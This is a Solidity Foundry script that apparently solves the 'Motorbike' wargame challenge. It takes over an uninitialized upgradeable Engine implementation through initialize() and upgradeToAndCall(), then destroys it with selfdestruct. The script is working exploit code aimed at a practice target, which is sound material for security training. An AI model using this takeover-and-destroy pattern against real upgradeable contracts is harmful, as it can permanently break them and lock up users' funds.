// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import {Motorbike, Engine} from "../src/25_Motorbike.sol";
import {Script, console} from "forge-std/Script.sol";

contract MotorbikeSolve is Script {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    Motorbike bike = Motorbike(0x5388029a3aFaE309f4deaD5C57e539aAa8B80e58);
    Engine engine = Engine(address(uint160(uint256(vm.load(address(bike), _IMPLEMENTATION_SLOT)))));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Engine Address#", address(engine));
        new Attack().exploit(address(engine));
        vm.stopBroadcast();
    }
}

contract Attack {
    Engine engine;

    function exploit(address engineAddr) public {
        engine = Engine(engineAddr);
        console.log("Attack Address#", address(this));

        engine.initialize();
        console.log("Upgrader#", engine.upgrader());
        bytes memory pwnSelector = abi.encodeWithSelector(this.pwn.selector);
        engine.upgradeToAndCall(address(this), pwnSelector);
    }

    function pwn() public {
        console.log("Pwned#", address(this));
        selfdestruct(payable(address(0)));
    }
}
